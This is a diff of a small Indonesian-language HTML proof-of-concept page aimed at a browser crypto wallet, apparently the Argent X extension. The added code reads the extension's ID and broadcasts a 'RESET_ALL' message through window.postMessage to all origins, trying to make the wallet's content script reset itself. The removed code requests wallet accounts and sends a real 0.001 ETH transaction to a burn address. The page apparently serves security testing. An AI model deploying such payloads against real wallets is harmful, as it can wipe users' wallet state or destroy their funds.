@@ -2,44 +2,32 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Uji Coba Transaksi Nyata</title>
+    <title>PoC dApp Wallet Interaction</title>
 </head>
 <body>
-    <h1>Security Audit: Verify Transaction</h1>
-    <button id="sendBtn" style="padding: 15px 30px; background: #d9534f; color: white; border: none; cursor: pointer;">
-        Kirim Transaksi Uji Coba
-    </button>
-    <p id="status"></p>
+    <h1>Security Test Interface</h1>
+    <button id="btnReset" style="padding: 20px; background: red; color: white;">Trigger RESET_ALL</button>
+    <pre id="log" style="background: #eee; padding: 10px;"></pre>
 
     <script>
-        document.getElementById('sendBtn').onclick = async () => {
-            if (window.ethereum) {
-                try {
-                    // Meminta akses ke dompet pengguna untuk skenario nyata
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    
-                    // Skenario: Mengirim 0.001 ETH ke alamat Dead (skenario nyata dari foto)
-                    const transactionParameters = {
-                        from: accounts[0],
-                        to: '0x000000000000000000000000000000000000dEaD', 
-                        value: '0x38D7EA4C68000', // 0.001 ETH dalam hex
-                        gas: '0x5208',
-                    };
+        const log = (msg) => document.getElementById('log').innerText += msg + '\n';
 
-                    // Memanggil fungsi transaksi asli
-                    const txHash = await window.ethereum.request({
-                        method: 'eth_sendTransaction',
-                        params: [transactionParameters],
-                    });
-                    
-                    document.getElementById('status').innerText = "Transaksi Terkirim! Hash: " + txHash;
-                } catch (error) {
-                    document.getElementById('status').innerText = "Ditolak: " + error.message;
-                }
-            } else {
-                alert("Peramban dApp tidak terdeteksi!");
-            }
-        };
+        document.getElementById('btnReset').addEventListener('click', () => {
+            // Target: MiscenalleousMessage seperti yang terlihat di 1000163978.png
+            const payload = {
+                type: "RESET_ALL",
+                // Terkadang diperlukan extensionId jika listener melakukan validasi asal
+                extensionId: document.getElementById("argent-x-extension")?.getAttribute("data-extension-id") || "unknown"
+            };
+
+            log("Mengirim pesan: " + JSON.stringify(payload));
+
+            // Mengirim ke seluruh jendela (window)
+            // Dalam dApp browser, window.postMessage sering dipantau oleh content script wallet
+            window.postMessage(payload, "*"); 
+            
+            log("Pesan telah dikirim.");
+        });
     </script>
 </body>
 </html>
